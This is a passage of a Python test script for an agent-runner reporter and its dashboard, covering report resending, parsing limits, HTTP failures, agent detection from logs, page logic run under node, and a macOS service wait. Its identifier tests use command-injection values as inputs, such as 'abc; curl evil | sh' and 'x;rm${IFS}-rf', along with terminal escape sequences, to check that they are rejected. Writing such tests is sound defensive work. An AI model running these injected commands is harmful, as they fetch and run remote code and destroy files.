with open(LOG6, "r+") as f: f.write(head6 + hundred("C", 20)); f.truncate()
rep6 = rr.Reporter(place6, os.getpid(), "1.1")      # the reporter itself is started again: it remembers nothing
for _ in range(4): cycle(rep6, U)
got6 = shown(U, place6.id)
check("and so is one written again while the reporter was not running (%d of 20)" % of("C", got6), of("C", got6) == 20, [l[-5:] for l in got6[-30:]])
held6 = rr.send(U, "", rep6.build()[0])
check("the dashboard hands back a fingerprint of what stood before the place it holds", isinstance(held6["out"].get("mark"), str) and len(held6["out"]["mark"]) == 40, held6)

# ---- one lost report is chance, not a fault
UO, _, PO = serve_()
ONCE, once = between(UO, once=2500)
W7, place7 = workspace("one-loss")
open(W7 + "/runs/1.1-20260101-000000.log", "w").write("attempt 1 of 4: new session abc-777\n" + dull(60, 100))
del NOTES[:]
rep7, th7 = reporting(place7, ONCE)
arrived7 = until(lambda: len(shown(UO, place7.id)) >= 61, 20)
time.sleep(0.5)
notes7 = [n[1] for n in NOTES if n[0] == "one-loss"]
rep7.given = 0; th7.join(10)
check("one report with files in it that is turned back on the way is sent again, and neither held back nor said to be lost", arrived7 and "once" not in once and not rep7.stuck and not any("not reaching" in n or "cannot be reached" in n for n in notes7), (arrived7, once, rep7.stuck, notes7))
rr.EVERY = 2

# ---- text that is another's: it cannot hang the dashboard, nor stop a report
N = 40_000
slow_text = "### 1.1 A [ ]  M: S medium, R: O high\n### 1." + "1" * N + "!\n### 1.2 x [ ] " + " " * N + "z\n### 1.3 Fine [ ]  M: S medium, R: O high\nbody\n"
t0 = time.time(); ids = [t["id"] for t in rr.parse_tasks(slow_text)]; took = time.time() - t0
check("a task file with two very long lines is read in %.2fs, and its other headings are read as they are" % took, took < 0.5 and ids == ["1.1", "1.2", "1.3"], (took, ids))
UR, _, PR = serve_()
call(UR + "/api/ingest", {**ok_runner, "id": "redos0000001", "tasks": {"hash": "r1"}, "tasks_md": slow_text})
box = {}
tt = threading.Thread(target=lambda: box.setdefault("code", call(UR + "/api/tasks?id=redos0000001")[0])); tt.start(); time.sleep(0.05)
t1 = time.time(); hc = call(UR + "/healthz")[0]; hz = time.time() - t1; tt.join(40)
check("while the dashboard reads such a task file for a page, every other question is still answered (in %.2fs)" % hz, hc == 200 and hz < 1.0 and box.get("code") == 200, (hc, hz, box))
sur = call(U + "/api/ingest", raw=json.dumps({**ok_runner, "id": "sur000000001", "tasks": {"hash": "s1"}, "tasks_md": "### 1.1 A\ud800b [ ]\n"}).encode())
got = call(U + "/api/tasks.md?id=sur000000001")
check("a task file holding a lone surrogate is taken, kept and shown, the surrogate replaced", sur[0] == 200 and got[0] == 200 and "A" in got[1], (sur[0], got[0]))
r_chars = serve.Runner("charcap00001")
for i in range(5000): r_chars.push("o", "x" * 4000)
r_short = serve.Runner("charcap00002")
for i in range(5000): r_short.push("o", "y" * 10)
check("a runner's output is bounded in characters as well as lines: %d kept of 20,000,000, and the count is the true one" % r_chars.chars, r_chars.chars <= serve.MAX_KEPT and r_chars.chars == sum(len(l[2]) for l in r_chars.lines) and r_chars.lines[-1][0] == 5000 and len(r_short.lines) == 4000 and r_short.chars == 40000, (r_chars.chars, r_short.chars, len(r_short.lines)))
for name, answer in (("an answer cut short in a refusal", b'HTTP/1.1 413 Payload Too Large\r\nTransfer-Encoding: chunked\r\nContent-Type: application/json\r\n\r\n40\r\n{"error":'),
                     ("an answer that is not HTTP", b"garbage\r\n\r\n"),
                     ("an answer cut short in a success", b'HTTP/1.1 200 OK\r\nContent-Length: 100\r\n\r\n{"ok":')):
    try: rr.ask(raw_server(answer) + "/api/ingest", "", b"{}"); outcome = "no failure"
    except rr.Unsent: outcome = "Unsent"
    except Exception as e: outcome = type(e).__name__
    check("%s is a failure to be tried again, and does not end the reporter" % name, outcome == "Unsent", outcome)
words = []
for name, answer in ((403, b"HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\n\r\n"), ("said", b'HTTP/1.1 403 Forbidden\r\nContent-Length: 30\r\nContent-Type: application/json\r\n\r\n{"error":"not from this name"}')):
    try: rr.ask(raw_server(answer) + "/api/ingest", "", b"{}")
    except rr.Unsent as why: words.append(str(why))
check("a 403 that says nothing is taken to be a refused token; one that says why is quoted", "refused this machine's token" in words[0] and words[1] == "answered 403: not from this name", words)

# ---- which process is watched
os.makedirs(W + "/runs/queue.lock"); sleeper = subprocess.Popen(["sleep", "30"]); procs.append(sleeper)
open(W + "/runs/queue.lock/pid", "w").write(str(sleeper.pid))
check("a queue lock that names a process which is not a queue is not taken for the queue", rr.queue_pid(place) == 0)
fake = subprocess.Popen([sys.executable, SP + "/run_queue_standin.py", "30"]); procs.append(fake); time.sleep(0.3)
open(W + "/runs/queue.lock/pid", "w").write(str(fake.pid))
check("and one that names a queue is", rr.queue_pid(place) == fake.pid)
rr.LAST_WORDS = 3
state = {"alive": False}
rep2 = rr.Reporter(place, 1, "")
real_build = rep2.build
rep2.build = lambda: (real_build()[0], state["alive"])
result = {}
t = threading.Thread(target=lambda: result.setdefault("rc", rr.report_until_done(place, rep2, "http://127.0.0.1:9", "")), daemon=True); t.start()
time.sleep(1.5); state["alive"] = True; time.sleep(5)
check("a reporter that has seen its queue end, and then sees a queue running again, stays with it", t.is_alive(), result)
state["alive"] = False; t.join(12)
check("and gives up, saying so, only when the runner has stayed ended for its last-words time", result.get("rc") == 1, result)

# ---- identifiers, the doctor's probe
check("an identifier that is not plainly one is not read from a log", rr.session_in("attempt 1 of 4: new session x;rm${IFS}-rf\n") == "" and rr.session_in("attempt 1 of 4: new session 63447abd-ad04-43c4-90f3-6e91745fda9a\n") == "63447abd-ad04-43c4-90f3-6e91745fda9a")
open(W + "/runs/in-charge", "w").write(json.dumps({"agent": "claude", "id": "abc; curl evil | sh", "at": 1}))
check("nor from a hand-written in-charge file", rr.session_in_charge(place) is None)
rc = subprocess.run([sys.executable, KIT + "/bin/runner_report.py", "--in-charge", "--agent", "claude", "--session", "a b;c"], capture_output=True, text=True, env={**os.environ})
check("nor recorded by --in-charge", rc.returncode != 0 and "identifier" in rc.stderr, rc.stderr[:200])
call(U + "/api/ingest", {**ok_runner, "id": "sess12345678", "sessions": {"work": {"agent": "claude", "id": "x`touch elsewhere`", "task": "1.1"}, "charge": {"agent": "codex", "id": "0199a3c2-7d4e"}}})
s = [r for r in strict(call(U + "/api/poll")[1])["runners"] if r["id"] == "sess12345678"][0]["sessions"]
check("and the dashboard drops one that arrives in a report, keeping the plain one beside it", s["work"] is None and s["charge"]["id"] == "0199a3c2-7d4e", s)
def probe(url, token):
    env = {**os.environ, "RUNNER_DASHBOARD_URL": url, "RUNNER_CONF": "/nonexistent"}
    env.pop("RUNNER_DASHBOARD_TOKEN", None)
    if token: env["RUNNER_DASHBOARD_TOKEN"] = token
    r = subprocess.run([sys.executable, KIT + "/bin/runner_report.py", "--check"], capture_output=True, text=True, env=env, cwd="/")
    return r.returncode, r.stdout.strip()
a, b, c = probe(UT, TOKEN), probe(UT, "wrong"), probe(UT, "")
check("the doctor's probe fails on a wrong token and on a missing one, and passes with the right one", (a[0], b[0], c[0]) == (0, 1, 1) and "refused" in b[1] and "token" in c[1], (a, b, c))
errlog = SP + "/rf-stderr.log"
PL = subprocess.Popen([sys.executable, KIT + "/dashboard/serve.py", "--port", "0", "--state-dir", tempfile.mkdtemp(dir=SP, prefix="rf-state-")], stdout=subprocess.PIPE, stderr=open(errlog, "w"), text=True); procs.append(PL)
port = int(PL.stdout.readline().split("127.0.0.1:")[1].split("/")[0])
with socket.create_connection(("127.0.0.1", port)) as raw_socket:
    raw_socket.sendall(b"GET /nothing-\x1b[31mred\x07-here HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n"); raw_socket.recv(4096)
time.sleep(0.5); logged = open(errlog, "rb").read()
check("a failed request is logged, with nothing in the line that could steer a terminal", b"nothing-" in logged and b"\x1b" not in logged and b"\x07" not in logged, logged[:200])


# ---- which agent wrote a log, read from what bin/render_stream.py itself writes
def rendered(events):
    """What bin/render_stream.py writes for these events; one that is text and not an event goes in as it is."""
    sent = "".join((e if isinstance(e, str) else json.dumps(e)) + "\n" for e in events)
    return subprocess.run([sys.executable, KIT + "/bin/render_stream.py"], input=sent, capture_output=True, text=True).stdout
by_claude = rendered([{"type": "system", "subtype": "init", "model": "a-model", "tools": [1, 2]},
                      {"type": "assistant", "message": {"content": [{"type": "text", "text": "I will read the task."}, {"type": "tool_use", "name": "Bash", "input": {"command": "cat notes"}}]}},
                      {"type": "user", "message": {"content": [{"type": "tool_result", "content": "codex: a line of a file, which no agent said"}]}},
                      {"type": "result", "subtype": "success", "num_turns": 2, "total_cost_usd": 0.1, "result": "5s  codex: words quoted in the last answer"}])
by_codex = rendered(["claude: command not found", {"type": "thread.started", "thread_id": "0199a3c2-7d4e"},
                     {"type": "item.completed", "item": {"type": "agent_message", "text": "Done."}}, {"type": "turn.completed", "usage": {"input_tokens": 1, "output_tokens": 2}}])
codex_said = "".join(l + "\n" for l in by_codex.split("\n") if l and "session started" not in l)     # the same log, had the session not named itself
check("the agent is read from the lines render_stream.py writes for what an agent said, which begin with its clock",
      "s  claude: I will read the task." in by_claude and "s  codex: Done." in by_codex and (rr.agent_in(by_claude), rr.agent_in(codex_said)) == ("claude", "codex"), (by_claude, by_codex, rr.agent_in(by_claude), rr.agent_in(codex_said)))
check("a line with no clock is not what an agent said: 'claude: command not found' in a Codex log does not name it Claude, and words quoted in a last answer name nobody",
      "claude: command not found\n" in codex_said and rr.agent_in(codex_said) == "codex" and (rr.agent_in("claude: command not found\ncodex: nor this\n"), rr.agent_in("      5s  codex: quoted\n"), rr.agent_in("the claude: of a sentence\n")) == ("", "", ""),
      (codex_said, rr.agent_in(codex_said), rr.agent_in("claude: command not found\ncodex: nor this\n"), rr.agent_in("      5s  codex: quoted\n")))
check("lines that name both agents name neither: the one tried first does not win", rr.agent_in(by_claude + codex_said) == "" and rr.agent_in(codex_said + by_claude) == "", (rr.agent_in(by_claude + codex_said), rr.agent_in(codex_said + by_claude)))
check("a Codex session that names itself as it starts is taken at its word, before any line of what was said",
      (rr.agent_in(by_codex.split("s  codex: ")[0]), rr.agent_in(by_codex + "     9s  claude: said by another\n"), rr.agent_in("session started  codex thread=no-clock\n")) == ("codex", "codex", ""), by_codex)
# A workspace whose settings name no adapter: the report itself carries the agent read from the log.
W8, place8 = workspace("agent-from-the-log")
open(W8 + "/runs/1.1-20260101-000000.log", "w").write("attempt 1 of 4: new session abc-888\n" + by_claude)
work8 = rr.Reporter(place8, os.getpid(), "1.1").build()[0]["sessions"]["work"]
check("a report from a workspace whose settings name no agent carries the agent read from its session log", work8 and (work8["kind"], work8["agent"], work8["id"]) == ("task", "claude", "abc-888"), work8)
open(W8 + "/runs/queue.log", "w").write("2026-01-01 10:00:00 supervising session old-stop-1 for task 1.0; raw x\n" + codex_said + "2026-01-01 10:01:00 verdict: SUPERVISOR: retry\n"
                                        "2026-01-01 10:02:00 supervising session new-stop-2 for task 1.1; raw y\n" + by_claude)
work8 = rr.Reporter(place8, os.getpid(), "").build()[0]["sessions"]["work"]
check("and a stop session is named from its own lines in the queue log, not from an earlier stop session's", work8 and (work8["kind"], work8["agent"], work8["id"]) == ("stop", "claude", "new-stop-2"), work8)

# ---- the page's own rules, run outside a browser
# The page marks the functions that need no browser (selftest-from to selftest-to). They are run here under node,
# with stand-ins for the little of the page they name. Without node they are not run, and this says so.
PAGE = open(KIT + "/dashboard/index.html", encoding="utf-8").read()
marked = [part.split("// selftest-to\n")[0] for part in PAGE.split("// selftest-from\n")[1:]]
STAND_INS = r"""'use strict';
// A fact is a function that answers [is it so, what was found]. One that cannot be run is a fact that failed.
const facts = [];
function fact(name, find) {
  let ok = false, detail;
  try { [ok, detail] = find(); } catch (e) { detail = 'could not be run: ' + e.message; }
  facts.push([name, !!ok, detail === undefined ? '' : JSON.stringify(detail)]);
}
const document = { createElement: (tag) => ({ tag, attrs: {}, kids: [], on: {}, className: '',
  setAttribute(k, v) { this.attrs[k] = v; }, addEventListener(name, fn) { this.on[name] = fn; }, append(...kids) { this.kids.push(...kids); } }) };
const KEEP_LINES = 1500, STATE = { models: new Map(), first: true };
let painted = 0, added = 0;
const status = (r) => ({ k: r.state }), label = (m) => m.id, news = () => {}, wire = () => {};
const paint = () => { painted++; }, addLines = (m, lines) => { added += lines.length; };
"""
FACTS = r"""
const same = (a, b) => JSON.stringify(a) === JSON.stringify(b);
const runner = (state, more) => ({ state, info: { pid: 100 }, parked: [], ...more });
const seen = (r, age) => hiddenSeen(r, age || 0, 600);
const hideAt = (r, age) => hiddenRecord({}, seen(r, age), 1000);
// Hidden with `rec`, a runner is then seen in each of these in turn: at which does it come back, and why?
function follow(rec, steps) {
  for (let i = 0; i < steps.length; i++) {
    const to = hiddenNext(rec, seen(...[].concat(steps[i])));
    if (typeof to === 'string') return [i, to];
    rec = to;
  }
  return 'stays hidden';
}
const one = [{ id: '1.1' }], two = [{ id: '1.1' }, { id: '1.2' }];
const buttons = (parts) => parts.filter((part) => part.tag === 'button');
// The browser's storage, as two tabs of one browser share it; and one that is full.
const storage = () => ({ held: {}, getItem(k) { return k in this.held ? this.held[k] : null; }, setItem(k, v) { this.held[k] = String(v); } });
const full = { getItem: () => null, setItem() { throw new Error('QuotaExceededError'); } };
const add = (id) => (map) => { map[id] = hiddenRecord(map, seen(runner('running')), 1000); };

fact('a runner hidden during a task stays hidden while its queue moves from task to task, and so does one hidden between tasks', () => {
  const queue = ['between', 'running', 'deciding', 'running', 'between', 'running'].map((s) => runner(s));
  const found = [follow(hideAt(runner('running')), queue), follow(hideAt(runner('between')), queue)];
  return [same(found, ['stays hidden', 'stays hidden']), found];
});
fact('a runner hidden while it ran comes back when it starts work again after it stopped, finished its queue, paused or went silent', () => {
  const found = [['stopped'], ['idle'], ['paused'], ['running', 700]].map(([state, age]) => follow(hideAt(runner('running')), [runner('between'), [runner(state), age], runner('running')]));
  return [same(found, [[2, 'work'], [2, 'work'], [2, 'work'], [2, 'work']]), found];
});
fact('and when this page never saw it stop, because another run of the runner is what works now; a runner at rest that stays at rest does not come back', () => {
  const found = [follow(hideAt(runner('running')), [runner('running', { info: { pid: 200 } })]), follow(hideAt(runner('stopped')), [runner('stopped'), runner('idle'), runner('stopped', { info: { pid: 200 } })])];
  return [same(found, [[0, 'work'], 'stays hidden']), found];
});
fact('a hidden runner comes back for a new question: a second beside the first, one parked during its queue, one parked again after its answer; and not for a question fewer', () => {
  const found = [follow(hideAt(runner('idle', { parked: one })), [runner('idle', { parked: one }), runner('idle', { parked: two })]),
    follow(hideAt(runner('running')), [runner('running'), runner('between', { parked: one })]),
    follow(hideAt(runner('idle', { parked: one })), [runner('idle', { parked: [] }), runner('idle', { parked: one })]),
    follow(hideAt(runner('idle', { parked: two })), [runner('idle', { parked: one }), runner('idle', { parked: one })])];
  return [same(found, [[1, 'question'], [1, 'question'], [1, 'question'], 'stays hidden']), found];
});
fact('what an earlier page kept is read: such a runner stays hidden, and what it is doing is taken from its next report', () => {
  const old = hiddenParse('{"a":"running","b":"waiting","c":7,"d":{"at":5,"phase":"work","asks":["1.1",2],"run":100}}');
  const found = [Object.keys(old), follow(old.b, [runner('idle', { parked: one }), runner('idle', { parked: one })]), follow(old.b, [runner('idle', { parked: one }), runner('idle', { parked: two })]), old.d.asks, Object.keys(hiddenParse('not json'))];
  return [same(found, [['a', 'b', 'd'], 'stays hidden', [1, 'question'], ['1.1'], []]), found];
});
fact('two open tabs do not undo each other: each change is made to what the browser holds at that moment', () => {
  const shared = storage();
  let a = hiddenLoad(shared), b = hiddenLoad(shared);     // both tabs are open before anything is hidden
  a = hiddenChange(shared, a.map, a.kept, add('x'));
  b = hiddenChange(shared, b.map, b.kept, add('y'));
  const both = Object.keys(hiddenParse(shared.getItem(HIDDEN_KEY))).sort();
  a = hiddenChange(shared, a.map, a.kept, (map) => { delete map.x; });
  const found = [both, Object.keys(hiddenParse(shared.getItem(HIDDEN_KEY))), Object.keys(a.map)];
  return [same(found, [['x', 'y'], ['y'], ['y']]), found];
});
fact('when more are hidden than are kept, the one hidden first is forgotten first, though its id is a word and the others are numbers', () => {
  const shared = storage();
  let all = hiddenLoad(shared);
  for (const id of ['alpha', ...Array.from({ length: HIDDEN_MOST }, (_, i) => String(i + 1))]) all = hiddenChange(shared, all.map, all.kept, add(id));
  return [Object.keys(all.map).length === HIDDEN_MOST && !('alpha' in all.map) && '1' in all.map && String(HIDDEN_MOST) in all.map, Object.keys(all.map).slice(0, 3)];
});
fact('where the browser will not store it, a runner is hidden all the same, and the line of hidden runners says the choice will not be remembered on this device', () => {
  let lone = hiddenChange(full, Object.create(null), true, add('x'));
  const first = [lone.kept, Object.keys(lone.map)];
  lone = hiddenChange(full, lone.map, lone.kept, add('y'));
  const said = (kept) => hiddenLine([{ id: 'x', name: 'X' }], kept, () => {}).filter((part) => part.tag === 'span').map((part) => part.kids.join(''));
  const found = [first, lone.kept, Object.keys(lone.map).sort(), hiddenLoad(null).kept, said(true), said(false).length];
  return [same(found, [[false, ['x']], false, ['x', 'y'], false, [], 1]) && /will not be remembered on this device/.test(said(false)[0]), [found, said(false)]];
});
fact('the line of hidden runners names each one, with a button that brings back that one, and one that brings back all', () => {
  const shown = [], line = buttons(hiddenLine([{ id: 'r1', name: 'Alpha' }, { id: 'r2', name: 'Beta' }], true, (id) => shown.push(id)));
  line[1].on.click(); line[2].on.click();
  const found = [line.map((x) => x.kids.join('')), shown, buttons(hiddenLine([{ id: 'r1', name: 'Alpha' }], true, () => {})).length];
  return [same(found, [['Alpha', 'Beta', 'show all 2'], ['r2', null], 1]), found];
});
fact('what reads as a link and is pressed is a button, which the keyboard reaches', () => {
  let pressed = 0;
  const press = link('Hide', () => { pressed++; }, { 'data-x': 'y' });
  press.on.click();
  const found = [press.tag, press.attrs.type, press.className, press.attrs['data-x'], pressed];
  return [same(found, ['button', 'button', 'link', 'y', 1]), found];
});
fact('with no pane under "At work" the page says that no runner is at work, or that those at work are hidden; with a pane there it says neither', () => {
  const found = [emptyWords(0, 0), emptyWords(0, 1), emptyWords(0, 2), emptyWords(1, 0), emptyWords(3, 2)];
  return [found[0] === 'No runner is at work.' && /1 at work is hidden on this device/.test(found[1]) && /2 at work are hidden on this device/.test(found[2]) && found[3] === '' && found[4] === '', found];
});
fact('when the pane the keyboard is on is hidden, the keyboard goes to the next pane, else the one before, else the line of hidden runners', () => {
  const found = [neighbour(['a', 'b', 'c'], 'b'), neighbour(['a', 'b', 'c'], 'c'), neighbour(['a'], 'a'), neighbour(['a'], 'z')];
  return [same(found, ['c', 'b', null, null]), found];
});
fact('a pane that is not on the page is not painted: its lines wait, and a log that starts afresh while it is away is shown afresh when it returns', () => {
  const off = { id: 'off', seq: 0, hits: [], sig: {}, el: { isConnected: false }, data: runner('running') };
  const on = { id: 'on', seq: 0, hits: [], sig: {}, el: { isConnected: true }, data: runner('running') };
  STATE.models.set('off', off); STATE.models.set('on', on);
  take({ id: 'off', state: 'running', lines: [[1, 'o', 'one'], [2, 'o', 'two']] });
  const waiting = [painted, added, (off.buffer || []).length];
  take({ id: 'off', state: 'running', reset: true, lines: [[1, 'o', 'afresh']] });
  take({ id: 'on', state: 'running', lines: [[1, 'o', 'one']] });
  const found = [waiting, off.buffer.length, off.wipe, painted, added];
  return [same(found, [[0, 0, 2], 1, true, 1, 1]), found];
});
console.log(JSON.stringify(facts));
"""
node = shutil.which("node")
if not node:
    print("SKIP the page's own rules (when a hidden runner comes back, what two tabs keep, what the line of hidden runners says, what is painted): node is not on the PATH, so none of them was run")
else:
    open(SP + "/page-rules.js", "w", encoding="utf-8").write(STAND_INS + "".join(marked) + FACTS)
    ran = subprocess.run([node, SP + "/page-rules.js"], capture_output=True, text=True, timeout=60)
    try: page_facts = json.loads(ran.stdout.strip().split("\n")[-1])
    except ValueError: page_facts = []
    check("the page's functions that need no browser run under node (%d parts of the page, %d facts)" % (len(marked), len(page_facts)), ran.returncode == 0 and len(marked) >= 3 and len(page_facts) >= 13, ran.stderr[-300:])
    for name, ok, detail in page_facts: check("the page: " + name, ok, detail)
# What only the page's text can show, short of a browser.
bare = [m.group(0)[:60] for m in re.finditer(r"h\('a', \{[^}]*", PAGE) if "href:" not in m.group(0)]
check("nothing on the page that is pressed is a link with no address, which the keyboard cannot reach", bare == [] and "h('a', {" in PAGE and PAGE.count("link('") >= 4, bare)
touch = re.search(r"@media \(max-width: 600px\), \(pointer: coarse\) \{(.*?)\n  \}", PAGE, re.S)
sizes = [int(n) for n in re.findall(r"\.p-side \.icon \{ min-width: (\d+)px; min-height: (\d+)px; \}", touch.group(1))[0]] if touch and ".p-side .icon" in touch.group(1) else []
gap = re.search(r"\.p-side \{ gap: (\d+)px; \}", touch.group(1)) if touch else None
check("under a finger a pane's two buttons are at least 44 pixels each way and at least 12 apart", len(sizes) == 2 and min(sizes) >= 44 and gap and int(gap.group(1)) >= 12 and PAGE.index(touch.group(0)) > PAGE.index(".icon, .tool { min-height: 34px"), (sizes, gap and gap.group(0)))
hide_body = PAGE.split("function hide(m) {")[1].split("\n}\n")[0]
check("the page follows a change made in another tab", "addEventListener('storage', (e) =>" in PAGE)
check("hiding a runner moves the keyboard on and says so where a reader of the screen hears it", "el.focus()" in hide_body and "\n  toast(" in hide_body and 'id="toast" role="status" aria-live="polite"' in PAGE, hide_body[-400:])

# ---- the Mac service waits for what it started, without launchd
SERVICE = KIT + "/dashboard/service-macos.sh"
def free_port():
    with socket.socket() as s: s.bind(("127.0.0.1", 0)); return s.getsockname()[1]
def wait_for(port, seconds):
    """service-macos.sh's own wait, on its own question to the dashboard: (exit code, seconds it took)."""
    t0 = time.time()
    try: rc = subprocess.run(["zsh", "-c", 'source "$0" --port "$1"; wait_until "$2" answers', SERVICE, str(port), str(seconds)], capture_output=True, timeout=40).returncode
    except subprocess.TimeoutExpired: rc = "still waiting after 40 seconds"
    return rc, time.time() - t0
if not shutil.which("zsh") or not shutil.which("curl"):
    print("SKIP the Mac service's wait for the dashboard: zsh or curl is not on the PATH, so it was not run")
else:
    late = free_port()
    threading.Timer(2.5, lambda: procs.append(subprocess.Popen([sys.executable, KIT + "/dashboard/serve.py", "--port", str(late), "--state-dir", tempfile.mkdtemp(dir=SP, prefix="rf-state-")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))).start()
    rc_late, took_late = wait_for(late, 30)
    check("the Mac service's wait goes on asking a dashboard that starts late, and ends when it answers (after %.1fs)" % took_late, rc_late == 0 and 2 <= took_late < 20, (rc_late, took_late))
    rc_never, took_never = wait_for(free_port(), 2)
    check("and gives up on one that never answers when its time is up (after %.1fs of 2)" % took_never, rc_never == 1 and 2 <= took_never < 12, (rc_never, took_never))

print("FAILS=%d" % len(FAILS)); sys.exit(1 if FAILS else 0)
